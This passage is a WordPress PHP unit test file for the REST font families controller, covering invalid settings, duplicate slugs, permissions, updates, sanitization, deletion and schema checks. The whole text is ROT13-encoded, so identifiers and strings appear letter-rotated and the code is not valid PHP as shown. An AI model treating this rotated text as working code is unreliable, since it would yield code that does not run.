					'fyht'       => 'bcra-fnaf-abgb-fnaf',
					'sbagSnzvyl' => '\"Bcra Fnaf\", \"Abgb Fnaf\", fnaf-frevs',
				),
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_vainyvq_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::inyvqngr_perngr_sbag_snpr_frggvatf
	 *
	 * @cnenz neenl $frggvatf Frggvatf gb grfg.
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_frggvatf( $frggvatf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_vainyvq_frggvatf() {
		erghea neenl(
			'Zvffvat anzr'          => neenl(
				'frggvatf' => neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'anzr' => '' ) ),
			),
			'Rzcgl anzr'            => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'anzr' => '' ) ),
			),
			'Jebat anzr glcr'       => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'anzr' => 1234 ) ),
			),
			'Zvffvat fyht'          => neenl(
				'frggvatf' => neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => '' ) ),
			),
			'Rzcgl fyht'            => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => '' ) ),
			),
			'Jebat fyht glcr'       => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => 1234 ) ),
			),
			'Zvffvat sbagSnzvyl'    => neenl(
				'frggvatf' => neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => '' ) ),
			),
			'Rzcgl sbagSnzvyl'      => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => '' ) ),
			),
			'Jebat sbagSnzvyl glcr' => neenl(
				'frggvatf' => neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'sbagSnzvyl' => 1234 ) ),
			),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyl_Pbagebyyre::inyvqngr_sbag_snzvyl_frggvatf
	 */
	choyvp shapgvba grfg_perngr_vgrz_vainyvq_frggvatf_wfba() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', 'vainyvq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_vainyvq_cnenz\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'sbag_snzvyl_frggvatf cnenzrgre zhfg or n inyvq WFBA fgevat.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_nyy_reebe_qngn()[0]['cnenzf']['sbag_snzvyl_frggvatf'];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyl_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_qhcyvpngr_fyht() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'gurzr_wfba_irefvba', JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => 'uryirgvpn' ) ) ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_qhcyvpngr_sbag_snzvyl', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_qhcyvpngr_sbag_snzvyl\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'N sbag snzvyl jvgu fyht \"uryirgvpn\" nyernql rkvfgf.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_reebe_zrffntrf()[0];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_ab_crezvffvba() {
		$frggvatf = neenl_zretr( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => 'bcra-fnaf-2' ) );
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_perngr\" jvgu 401 fgnghf.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf' );
		$erdhrfg->frg_cnenz(
			'sbag_snzvyl_frggvatf',
			jc_wfba_rapbqr(
				neenl(
					'anzr'       => 'Bcra Fnaf',
					'fyht'       => 'bcra-fnaf',
					'sbagSnzvyl' => '\"Bcra Fnaf\", fnaf-frevs',
					'cerivrj'    => 'uggcf://f.j.bet/vzntrf/sbagf/16.7/cerivrjf/bcra-fnaf/bcra-fnaf-400-abezny.fit',
				)
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_perngr\" jvgu 403 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$frggvatf = neenl(
			'anzr'       => 'Bcra Fnaf',
			'sbagSnzvyl' => 'Bcra Fnaf, \"Abgb Fnaf\", fnaf-frevs',
			'cerivrj'    => 'uggcf://f.j.bet/vzntrf/sbagf/16.9/cerivrjf/bcra-fnaf/bcra-fnaf-400-abezny.fit',
		);

		$sbag_snzvyl_vq = frys::perngr_sbag_snzvyl_cbfg( neenl( 'fyht' => 'bcra-fnaf-2' ) );
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erdhrfg->frg_cnenz(
			'sbag_snzvyl_frggvatf',
			jc_wfba_rapbqr( $frggvatf )
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn, $sbag_snzvyl_vq, $erfcbafr->trg_yvaxf() );

		$rkcrpgrq_frggvatf = neenl(
			'anzr'       => $frggvatf['anzr'],
			'fyht'       => 'bcra-fnaf-2',
			'sbagSnzvyl' => '\"Bcra Fnaf\", \"Abgb Fnaf\", fnaf-frevs',
			'cerivrj'    => $frggvatf['cerivrj'],
		);
		$guvf->nffregFnzr( $rkcrpgrq_frggvatf, $qngn['sbag_snzvyl_frggvatf'], 'Gur erfcbafr sbag_snzvyl_frggvatf fubhyq zngpu rkcrpgrq frggvatf.' );
	}

	/**
	 * @qngnCebivqre qngn_hcqngr_vgrz_vaqvivqhny_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 *
	 * @cnenz neenl $frggvatf Frggvatf gb grfg.
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vaqvivqhny_frggvatf( $frggvatf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$sbag_snzvyl_vq = frys::perngr_sbag_snzvyl_cbfg();
		$erdhrfg        = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$xrl   = xrl( $frggvatf );
		$inyhr = pheerag( $frggvatf );
		$guvf->nffregNeenlUnfXrl( $xrl, $qngn['sbag_snzvyl_frggvatf'], 'Gur rkcrpgrq xrl fubhyq rkvfg va gur sbag_snzvyl_frggvatf qngn.' );
		$guvf->nffregFnzr( $inyhr, $qngn['sbag_snzvyl_frggvatf'][ $xrl ], 'Gur sbag_snzvyl_frggvatf qngn fubhyq zngpu.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_hcqngr_vgrz_vaqvivqhny_frggvatf() {
		erghea neenl(
			neenl( neenl( 'anzr' => 'Bcrarq Fnaf' ) ),
			neenl( neenl( 'sbagSnzvyl' => '\"Bcrarq Fnaf\", fnaf-frevs' ) ),
			neenl( neenl( 'cerivrj' => 'uggcf://f.j.bet/vzntrf/sbagf/16.7/cerivrjf/bcrarq-fnaf/bcrarq-fnaf-400-abezny.fit' ) ),
			// Rzcgl cerivrj vf nyybjrq.
			neenl( neenl( 'cerivrj' => '' ) ),
		);
	}

	/**
	 * @qngnCebivqre qngn_fnavgvmr_sbag_snzvyl_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::fnavgvmr_sbag_snzvyl_frggvatf
	 *
	 * @cnenz fgevat $frggvatf Sbag snzvyl frggvatf gb grfg.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq frggvatf erfhyg.
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_fnavgvmr_sbag_snzvyl_frggvatf( $frggvatf, $rkcrpgrq ) {
		// Hafrg/zbqvsl fyht sebz gur qngn cebivqre, fvapr jr'er hcqngvat engure guna perngvat.
		hafrg( $frggvatf['fyht'] );
		$vavgvny_frggvatf = neenl( 'fyht' => 'bcra-fnaf-hcqngr' );
		$rkcrpgrq         = neenl_zretr( frys::$qrsnhyg_frggvatf, $rkcrpgrq, $vavgvny_frggvatf );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$sbag_snzvyl_vq                = frys::perngr_sbag_snzvyl_cbfg( $vavgvny_frggvatf );
		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $sbag_snzvyl_vq;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregFnzr( $rkcrpgrq, $qngn['sbag_snzvyl_frggvatf'], 'Gur erfcbafr sbag_snzvyl_frggvatf fubhyq zngpu.' );
	}

	/**
	 * @qngnCebivqre qngn_hcqngr_vgrz_vainyvq_frggvatf
	 *
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 *
	 * @cnenz neenl $frggvatf Frggvatf gb grfg.
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_rzcgl_frggvatf( $frggvatf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erdhrfg->frg_cnenz(
			'sbag_snzvyl_frggvatf',
			jc_wfba_rapbqr( $frggvatf )
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_hcqngr_vgrz_vainyvq_frggvatf() {
		erghea neenl(
			'Rzcgl anzr'            => neenl(
				neenl( 'anzr' => '' ),
			),
			'Jebat anzr glcr'       => neenl(
				neenl( 'anzr' => 1234 ),
			),
			'Rzcgl sbagSnzvyl'      => neenl(
				neenl( 'sbagSnzvyl' => '' ),
			),
			'Jebat sbagSnzvyl glcr' => neenl(
				neenl( 'sbagSnzvyl' => 1234 ),
			),
		);
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_hcqngr_fyht_abg_nyybjrq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erdhrfg->frg_cnenz(
			'sbag_snzvyl_frggvatf',
			jc_wfba_rapbqr( neenl( 'fyht' => 'arj-fyht' ) )
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_vainyvq_cnenz\" jvgu 400 fgnghf.' );
		$rkcrpgrq_zrffntr = 'sbag_snzvyl_frggvatf[fyht] pnaabg or hcqngrq.';
		$zrffntr          = $erfcbafr->nf_reebe()->trg_nyy_reebe_qngn()[0]['cnenzf']['sbag_snzvyl_frggvatf'];
		$guvf->nffregFnzr( $rkcrpgrq_zrffntr, $zrffntr, 'Gur erfcbafr reebe zrffntr fubhyq zngpu.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_sbag_snzvyl_vq() {
		$frggvatf = neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => '' ) );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_cbfg_vainyvq_vq\" jvgu 404 fgnghf.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ab_crezvffvba() {
		$frggvatf = neenl_qvss_xrl( frys::$qrsnhyg_frggvatf, neenl( 'fyht' => '' ) );

		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_rqvg\" jvgu 401 fgnghf sbe na vainyvq hfre.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq1 );
		$erdhrfg->frg_cnenz( 'sbag_snzvyl_frggvatf', jc_wfba_rapbqr( $frggvatf ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_rqvg', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_rqvg\" jvgu 403 fgnghf sbe n hfre jvgubhg crezvffvba.' );
	}


	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$sbag_snzvyl_vq   = frys::perngr_sbag_snzvyl_cbfg();
		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erdhrfg['sbepr'] = gehr;
		$erfcbafr         = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->nffregAhyy( trg_cbfg( $sbag_snzvyl_vq ), 'Gur cbfg fubhyq abg rkvfg nsgre qryrgvat.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$sbag_snzvyl_vq = frys::perngr_sbag_snzvyl_cbfg();

		// Nggrzcg genfuvat.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_genfu_abg_fhccbegrq\" jvgu 501 fgnghf.' );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501, 'Jura \"sbepr\" vf snyfr, gur erfcbafr fubhyq erghea na reebe sbe \"erfg_genfu_abg_fhccbegrq\" jvgu 501 fgnghf.' );

		// Rafher gur cbfg fgvyy rkvfgf.
		$cbfg = trg_cbfg( $sbag_snzvyl_vq );
		$guvf->nffregAbgRzcgl( $cbfg, 'Gur cbfg fubhyq fgvyy rkvfg.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_sbag_snzvyl_vq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_cbfg_vainyvq_vq', $erfcbafr, 404 );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_ab_crezvffvbaf() {
		$sbag_snzvyl_vq = frys::perngr_sbag_snzvyl_cbfg();

		jc_frg_pheerag_hfre( 0 );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 401, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_qryrgr\" jvgu 401 fgnghf sbe na vainyvq hfre.' );

		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/sbag-snzvyvrf/' . $sbag_snzvyl_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403, 'Gur erfcbafr fubhyq erghea na reebe sbe \"erfg_pnaabg_qryrgr\" jvgu 403 fgnghf sbe n hfre jvgubhg crezvffvba.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/sbag-snzvyvrf/' . frys::$sbag_snzvyl_vq2 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$guvf->purpx_sbag_snzvyl_qngn( $qngn, frys::$sbag_snzvyl_vq2, $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/sbag-snzvyvrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 4, $cebcregvrf, 'Gurer fubhyq or 4 cebcregvrf va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf, 'Gur vq cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $cebcregvrf, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snprf', $cebcregvrf, 'Gur sbag_snprf cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
		$guvf->nffregNeenlUnfXrl( 'sbag_snzvyl_frggvatf', $cebcregvrf, 'Gur sbag_snzvyl_frggvatf cebcregl fubhyq rkvfg va gur fpurzn::cebcregvrf qngn.' );
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn_sbag_snzvyl_frggvatf_fubhyq_nyy_unir_fnavgvmr_pnyyonpxf() {
		$fpurzn                      = ( arj JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre( 'jc_sbag_snzvyl' ) )->trg_vgrz_fpurzn();
		$sbag_snzvyl_frggvatf_fpurzn = $fpurzn['cebcregvrf']['sbag_snzvyl_frggvatf'];

		$guvf->nffregNeenlUnfXrl( 'cebcregvrf', $sbag_snzvyl_frggvatf_fpurzn, 'sbag_snzvyl_frggvatf fpurzn vf zvffvat cebcregvrf.' );
		$guvf->nffregVfNeenl( $sbag_snzvyl_frggvatf_fpurzn['cebcregvrf'], 'sbag_snzvyl_frggvatf cebcregvrf fubhyq or na neenl.' );

		// net_bcgvbaf fubhyq or erzbirq sbe rnpu frggvat cebcregl.
		sbernpu ( $sbag_snzvyl_frggvatf_fpurzn['cebcregvrf'] nf $cebcregl ) {
			$guvf->nffregNeenlUnfXrl( 'net_bcgvbaf', $cebcregl, 'Frggvat fpurzn fubhyq unir net_bcgvbaf.' );
			$guvf->nffregNeenlUnfXrl( 'fnavgvmr_pnyyonpx', $cebcregl['net_bcgvbaf'], 'Frggvat fpurzn fubhyq unir n fnavgvmr_pnyyonpx.' );
			$guvf->nffregVfPnyynoyr( $cebcregl['net_bcgvbaf']['fnavgvmr_pnyyonpx'], 'Gung fnavgvmr_pnyyonpx inyhr fubhyq or pnyynoyr.' );
		}
	}

	/**
	 * @pbiref JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::trg_choyvp_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_choyvp_vgrz_fpurzn_fubhyq_abg_unir_net_bcgvbaf() {
		$fpurzn                      = ( arj JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre( 'jc_sbag_snzvyl' ) )->trg_choyvp_vgrz_fpurzn();
		$sbag_snzvyl_frggvatf_fpurzn = $fpurzn['cebcregvrf']['sbag_snzvyl_frggvatf'];

		$guvf->nffregNeenlUnfXrl( 'cebcregvrf', $sbag_snzvyl_frggvatf_fpurzn, 'sbag_snzvyl_frggvatf fpurzn vf zvffvat cebcregvrf.' );
		$guvf->nffregVfNeenl( $sbag_snzvyl_frggvatf_fpurzn['cebcregvrf'], 'sbag_snzvyl_frggvatf cebcregvrf fubhyq or na neenl.' );

		// net_bcgvbaf fubhyq or erzbirq sbe rnpu frggvat cebcregl.
		sbernpu ( $sbag_snzvyl_frggvatf_fpurzn['cebcregvrf'] nf $cebcregl ) {
			$guvf->nffregNeenlAbgUnfXrl( 'net_bcgvbaf', $cebcregl, 'net_bcgvbaf fubhyq or erzbirq sebz gur fpurzn sbe rnpu frggvat.' );
		}
	}

	/**
	 * Vs JC_Gurzr_WFBA::YNGRFG_FPURZN vf punatrq, gur pbagebyyre fubhyq or hcqngrq gb unaqyr nal qvssreraprf
	 * va `sbagSnzvyvrf` fgehpgher gb rafher fhccbeg sbe gur yngrfg gurzr.wfba fpurzn, naq onpxjneqf pbzcngvovyvgl
	 * sbe rkvfgvat jc_sbag_snzvyl cbfgf.
	 */
	choyvp shapgvba grfg_pbagebyyre_fhccbegf_yngrfg_gurzr_wfba_irefvba() {
		$guvf->nffregFnzr( JC_Gurzr_WFBA::YNGRFG_FPURZN, JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ );
	}

	cebgrpgrq shapgvba purpx_sbag_snzvyl_qngn( $qngn, $cbfg_vq, $yvaxf ) {
		fgngvp::$cbfg_vqf_gb_pyrnahc[] = $cbfg_vq;
		$cbfg                          = trg_cbfg( $cbfg_vq );

		$guvf->nffregNeenlUnfXrl( 'vq', $qngn, 'Gur vq cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( $cbfg->VQ, $qngn['vq'], 'Gur \"vq\" sebz gur erfcbafr qngn fubhyq zngpu gur cbfg VQ.' );

		$guvf->nffregNeenlUnfXrl( 'gurzr_wfba_irefvba', $qngn, 'Gur gurzr_wfba_irefvba cebcregl fubhyq rkvfg va erfcbafr qngn.' );
		$guvf->nffregFnzr( JC_ERFG_Sbag_Snzvyvrf_Pbagebyyre::YNGRFG_GURZR_WFBA_IREFVBA_FHCCBEGRQ, $qngn['gurzr_wfba_irefvba'], 'Gur \"gurzr_wfba_irefvba\" sebz gur erfcbafr qngn fubhyq zngpu gur yngrfg irefvba fhccbegrq ol gur pbagebyyre.' );

		$sbag_snpr_vqf = trg_puvyqera(
			neenl(
				'svryqf'      => 'vqf',
				'cbfg_cnerag' => $cbfg_vq,
				'cbfg_glcr'   => 'jc_sbag_snpr',
				'beqre'       => 'NFP',
				'beqreol'     => 'VQ',
			)
		);
